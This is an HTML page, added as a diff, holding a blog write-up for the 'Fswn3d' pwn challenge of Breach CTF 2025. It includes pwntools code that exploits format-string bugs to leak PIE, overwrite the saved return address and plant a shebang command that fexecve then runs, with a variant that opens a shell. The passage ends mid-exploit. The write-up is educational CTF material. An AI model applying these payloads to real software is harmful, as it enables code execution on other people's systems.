@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Last weekend, I took part in Breach CTF individually and got 10th place. The pwn challenges were pretty chill, so here are some writeups:
+pwn/Fswn3d: format string and fexecve pwn/Magicvault: unlink exploit in a unique context pwn/Fswn3d Analysis - win() ctfplayer@enxgmatic:~/breachers/fswn3d$ checksec main [*] &#39;/home/ctfplayer/breachers/fswn3d/main&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Looking at the source, we are given a win function.
+" />
+<meta name="keywords" content=", ctf, pwn" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#494f5c" />
+<link rel="canonical" href="https://enxgmatic.github.io/blog/breach-ctf-2025/" />
+
+
+    <title>
+        
+            Breach CTF 2025 pwn writeups - enxgmatic&#39;s hidey hole 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.5fcad444a7849ba937342f254165b4c1cd5a34a191cd61d23fe4623b1f3a5452.css" integrity="sha256-X8rURKeEm6k3NC8lQWW0wc1aNKGRzWHSP&#43;RiOx86VFI=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Breach CTF 2025 pwn writeups">
+  <meta itemprop="description" content="Last weekend, I took part in Breach CTF individually and got 10th place. The pwn challenges were pretty chill, so here are some writeups:
+pwn/Fswn3d: format string and fexecve pwn/Magicvault: unlink exploit in a unique context pwn/Fswn3d Analysis - win() ctfplayer@enxgmatic:~/breachers/fswn3d$ checksec main [*] &#39;/home/ctfplayer/breachers/fswn3d/main&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Looking at the source, we are given a win function.">
+  <meta itemprop="datePublished" content="2025-04-10T22:09:48+08:00">
+  <meta itemprop="dateModified" content="2025-04-10T22:09:48+08:00">
+  <meta itemprop="wordCount" content="2333">
+  <meta itemprop="keywords" content="Ctf,Pwn">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Breach CTF 2025 pwn writeups">
+  <meta name="twitter:description" content="Last weekend, I took part in Breach CTF individually and got 10th place. The pwn challenges were pretty chill, so here are some writeups:
+pwn/Fswn3d: format string and fexecve pwn/Magicvault: unlink exploit in a unique context pwn/Fswn3d Analysis - win() ctfplayer@enxgmatic:~/breachers/fswn3d$ checksec main [*] &#39;/home/ctfplayer/breachers/fswn3d/main&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Looking at the source, we are given a win function.">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2025-04-10 22:09:48 &#43;0800 &#43;08" />
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">~</span>
+            <span class="logo__text ">
+                $ ./enxgmatic</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/blog/">Blog</a></li><li><a href="/about/">About</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title" style="margin-bottom:6px">
+        <a href="https://enxgmatic.github.io/blog/breach-ctf-2025/">Breach CTF 2025 pwn writeups</a>
+      </h1>
+
+      
+
+      <div class="post-info" style="margin-top:6px">
+        
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://enxgmatic.github.io/tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="https://enxgmatic.github.io/tags/pwn/">pwn</a></span>
+        
+    </p>
+
+        
+        
+        
+  
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+            <line x1="16" y1="2" x2="16" y2="6"></line>
+            <line x1="8" y1="2" x2="8" y2="6"></line>
+            <line x1="3" y1="10" x2="21" y2="10"></line>
+          </svg>
+          
+            2025-04-10 22:09 &#43;0800
+          
+  
+           
+            
+          
+        </p>
+
+        <br>
+      </div>
+
+      
+        <hr>
+        <aside id="toc">
+          <div class="toc-title">Table of Contents:</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwnfswn3d">pwn/Fswn3d</a>
+      <ul>
+        <li><a href="#analysis---win">Analysis - win()</a></li>
+        <li><a href="#analysis---main-and-vuln">Analysis - main() and vuln()</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwnmagicvault">pwn/MagicVault</a>
+      <ul>
+        <li><a href="#analysis">Analysis</a></li>
+        <li><a href="#analysis---magic_buddy">Analysis - magic_buddy</a></li>
+        <li><a href="#analysis---main">Analysis - main</a></li>
+        <li><a href="#exploit-1">Exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+        <hr>
+
+      
+
+      <div class="post-content">
+        <p>Last weekend, I took part in Breach CTF individually and got 10th place. The pwn challenges were pretty chill, so here are some writeups:</p>
+<ul>
+<li><code>pwn/Fswn3d</code>: format string and fexecve</li>
+<li><code>pwn/Magicvault</code>: unlink exploit in a unique context</li>
+</ul>
+<h2 id="pwnfswn3d">pwn/Fswn3d</h2>
+<h3 id="analysis---win">Analysis - win()</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ctfplayer@enxgmatic:~/breachers/fswn3d$ checksec main
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ctfplayer/breachers/fswn3d/main&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></div><p>Looking at the source, we are given a win function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">152</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// create a new file descriptor with filename “payload”
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;payload&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;memfd_create&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// write the value of buffer to the file referred to by the file descriptor
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">148</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">148</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;write&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// The file created by `memfd_create` will be executed by fexecve
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fexecve&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><code>fexecve</code> and <code>memfd_create</code> stand out. Based on the man pages, <a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html"><code>memfd_create</code></a> creates an anonymous file (a temporary file in RAM). This created file is then passed to <a href="https://man7.org/linux/man-pages/man3/fexecve.3.html"><code>fexecve</code></a>, which can be viewed as <code>execve</code> but for file descriptors. We can control what is executed by changing the contents of the file.</p>
+<p>Ok, but what should we write into the file for <code>fexecve</code> to return the flag?</p>
+<p>While typically we can run <code>execve(/bin/sh)</code> to get a shell, if we write <code>/bin/sh</code> to a file descriptor, we get an exec format error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// code to demonstrate memfd_create and fexecve
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">152</span><span class="p">]</span> <span class="o">=</span> <span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;payload&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">148</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fexecve&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// output: fexecve: Exec format error
+</span></span></span></code></pre></div><p>Following a writeup from <a href="https://ctftime.org/writeup/37692">ctftime</a>, turns out we need to use shebangs, i.e. the characters <code>#!</code>. Written at the start of scripts, they indicate which interpreter to execute the file with.</p>
+
+
+
+    <blockquote class="alert alert-note">
+        <p class="alert-heading">
+            ℹ️
+            <b>
+                
+                    Note
+                
+            </b>
+        </p>
+        <p>You may have come across <code>.sh</code> scripts with the first line <code>#!/bin/bash</code>.<br>
+When you run such a file using the command <code>./script-name-here.sh</code>, it actually runs <code>/bin/bash ./script-name-here.sh</code>.</p>
+    </blockquote>
+
+
+
+    <blockquote class="alert alert-note">
+        <p class="alert-heading">
+            ℹ️
+            <b>
+                
+                    Note
+                
+            </b>
+        </p>
+        <p>Another common occurrence of shebangs is at the beginning of python files. For example, in the screenshot, running <code>./sample.py</code> is equivalent to running <code>python3 sample.py</code></p>
+    </blockquote>
+<figure>
+    <img src="assets/fsw_1.png">
+    <figcaption>Sample script demonstrating the use of shebangs with python3</figcaption>
+</figure>
+<p>Therefore, we need to write <code>#!{command here}</code> to the file to execute commands. There are numerous ways we can get the flag from here, below is 2 of them:</p>
+<ul>
+<li>One is to use <code>#!/bin/cat flag.txt</code> to directly read the flag using <code>cat</code> (I’ll be using this for the writeup).</li>
+<li>Another is with <code>#!/bin/sh\n/bin/sh</code>. This pops a shell when executed.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// code to demonstrate memfd_create and fexecve
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">152</span><span class="p">]</span> <span class="o">=</span> <span class="err">“#</span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="err">”</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;payload&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">148</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fexecve&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// output: flag{test}
+</span></span></span></code></pre></div><p>Since data from <code>buffer</code> is written into the file, we now need to find a way to control <code>buffer</code> to execute commands.</p>
+<h3 id="analysis---main-and-vuln">Analysis - main() and vuln()</h3>
+<p>The main function simply calls <code>vuln()</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// run vuln()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Let’s look at <code>vuln()</code> then.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">first_name</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">last_name</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">**</span><span class="n">hint</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">__builtin_frame_address</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// get input for first_name
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your first name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">first_name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">first_name</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You entered &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">first_name</span><span class="p">);</span> <span class="c1">// format string vulnerability
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// get input for last_name
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your last name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">last_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">last_name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">last_name</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">last_name</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You entered &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">last_name</span><span class="p">);</span> <span class="c1">// format string vulnerability
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>It can be clearly seen there are two <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/format-string">format string vulnerabilities</a>, giving us arbitrary read and write.</p>
+<p>In summary, we need to make use of the format string vulns to complete the following:</p>
+<ul>
+<li>Write the string <code>#!/bin/cat flag.txt</code> into <code>buffer</code></li>
+<li>Ret2win by overwriting rip</li>
+</ul>
+<h3 id="exploit">Exploit</h3>
+<p>First off, let’s get some leaks. In the context of this challenge, the only one we are concerned with is PIE, since it affects the address of <code>buffer</code> and <code>win()</code>.</p>
+<p>After playing around with the input, we can see the 6th offset points to the start of the stack.</p>
+<ul>
+<li>The address of the saved rip is at offset 7 (this is the variable <code>hint</code>).</li>
+<li>The start of <code>first_name</code> is at offset 8, while <code>last_name</code> is at offset 12.</li>
+<li>Offset 19, which is the saved rip, will be suitable to obtain a PIE leak.</li>
+</ul>
+<figure>
+    <img src="assets/fsw_2.png">
+    <figcaption>The stack</figcaption>
+</figure>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./main_patched&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># get pie leak</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%19$lx.&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;You entered &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x5555555554b5</span> <span class="o">-</span> <span class="mh">0x0000555555554000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;pie leak:&#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span></span></code></pre></div><p>Now, we are left with only one more input (for <code>last_name</code>).That is certainly not enough to both overwrite the saved rip to win() as well as to write to <code>buffer</code>. So, let’s instead overwrite the rip to point to <code>main()</code> to give ourselves more format string exploits.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># overwrite the last byte of rip to the start of main</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%123x</span><span class="s1">%7$hhn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div>
+
+
+    <blockquote class="alert alert-note">
+        <p class="alert-heading">
+            ℹ️
+            <b>
+                
+                    Note
+                
+            </b>
+        </p>
+        <p>To explain the payload:</p>
+<ul>
+<li>123 or 0x7b is the value of the last byte of <code>main()</code>. We only need to overwrite the last byte here since the rest of the bytes in the saved rip is the same as <code>main()</code>.</li>
+<li><code>%123x</code> prints out 0x7b characters.</li>
+<li><code>%7$hhn</code> writes the number of characters printed out (i.e. 0x7b) to the address stored at offset 7 (i.e. the saved rip). <code>hhn</code> ensures that only 1 byte is overwritten.</li>
+</ul>
+    </blockquote>
+<p>Moving on to <code>buffer</code>, I decided to write one byte of the command at a time, while also overwriting the rip to <code>main()</code> every round. This way, we effectively gain unlimited format string exploits.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># overwrite buffer to this command</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;#!/bin/cat flag.txt&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># get address of buffer</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x555555558040</span> <span class="o">-</span> <span class="mh">0x0000555555554000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># overwrite buffer to the command we need, one byte at a time</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;first name&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%123x</span><span class="s1">%7$hhn&#39;</span> <span class="c1"># overwrite rip to main, so we can repeat this process</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="c1"># buffer adr to write to, at offset 10, for use in the next input</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">command</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;%10$hhn&#39;</span> <span class="c1"># overwrite buffer one byte at a time</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div>
+
+
